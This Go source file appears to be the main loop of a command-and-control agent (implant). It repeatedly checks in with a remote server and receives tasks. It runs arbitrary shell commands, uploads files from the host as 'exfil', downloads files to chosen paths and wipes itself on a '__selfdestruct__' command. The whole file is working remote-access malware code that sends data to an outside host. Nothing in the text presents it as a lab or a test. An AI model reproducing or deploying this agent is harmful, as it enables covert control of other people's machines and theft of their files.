package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"c2-agent/funcs"
)

type CheckInPayload struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type CheckInResponse struct {
	Status string `json:"status"`
	Tasks  []Task `json:"tasks"`
}

type Task struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type ResultPayload struct {
	TaskID int    `json:"task_id"`
	Output string `json:"output"`
}

func main() {
	InitConfig()

	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	fmt.Printf("\n[*] Starting check-in loop (every %s)…\n\n", CheckInInterval)

	for {
		tasks, err := checkIn(hostname, agentOS)
		if err != nil {
			fmt.Printf("[!] Check-in failed: %v\n", err)
			time.Sleep(CheckInInterval)
			continue
		}

		fmt.Printf("[+] Checked in — %d pending task(s)\n", len(tasks))

		for _, task := range tasks {
			fmt.Printf("[>] Executing task #%d: %s\n", task.ID, task.Command)

			if task.Command == "__selfdestruct__" {
				fmt.Println("[!] Self-destruct command received from server!")
				_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
				funcs.SelfDestruct()
			}

			// cd is handled synchronously — it mutates CurrentDir which subsequent commands depend on
			if funcs.IsCdCommand(task.Command) {
				output, cdErr := funcs.ExecuteCommand(task.Command)
				if cdErr != nil {
					output = fmt.Sprintf("Error: %v", cdErr)
				}
				fmt.Printf("[<] Task #%d result: %s\n", task.ID, output)
				_ = sendResult(task.ID, output)
				continue
			}

			if strings.HasPrefix(task.Command, "get ") {
				go func(t Task) {
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.UploadFile(ServerURL, AgentID, filePath)
					if err != nil {
						output = fmt.Sprintf("Exfil error: %v", err)
					}
					fmt.Printf("[<] Task #%d result: %s\n", t.ID, output)
					_ = sendResult(t.ID, output)
				}(task)
				continue
			}

			if strings.HasPrefix(task.Command, "download ") {
				go func(t Task) {
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {
						_ = sendResult(t.ID, "Usage: download <file_id> <save_path>")
						return
					}
					output, err := funcs.DownloadFile(ServerURL, parts[0], strings.TrimSpace(parts[1]))
					if err != nil {
						output = fmt.Sprintf("Download error: %v", err)
					}
					fmt.Printf("[<] Task #%d result: %s\n", t.ID, output)
					_ = sendResult(t.ID, output)
				}(task)
				continue
			}

			go func(t Task) {
				output, execErr := funcs.ExecuteCommand(t.Command)
				if execErr != nil && output == "" {
					output = fmt.Sprintf("Error: %v", execErr)
				}
				fmt.Printf("[<] Task #%d result (%d bytes)\n", t.ID, len(output))
				err := sendResult(t.ID, output)
				if err != nil {
					fmt.Printf("[!] Failed to send result for task #%d: %v\n", t.ID, err)
				}
			}(task)
		}

		time.Sleep(CheckInInterval)
	}
}

func checkIn(hostname, agentOS string) ([]Task, error) {
	payload := CheckInPayload{
		AgentID:  AgentID,
		Hostname: hostname,
		OS:       agentOS,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("marshal error: %w", err)
	}

	resp, err := http.Post(
		ServerURL+"/api/checkin",
		"application/json",
		bytes.NewBuffer(body),
	)
	if err != nil {
		return nil, fmt.Errorf("request error: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read error: %w", err)
	}

	var result CheckInResponse
	err = json.Unmarshal(respBody, &result)
	if err != nil {
		return nil, fmt.Errorf("unmarshal error: %w", err)
	}

	return result.Tasks, nil
}

func sendResult(taskID int, output string) error {
	payload := ResultPayload{
		TaskID: taskID,
		Output: output,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("marshal error: %w", err)
	}

	resp, err := http.Post(
		ServerURL+"/api/result",
		"application/json",
		bytes.NewBuffer(body),
	)
	if err != nil {
		return fmt.Errorf("request error: %w", err)
	}
	defer resp.Body.Close()

	return nil
}
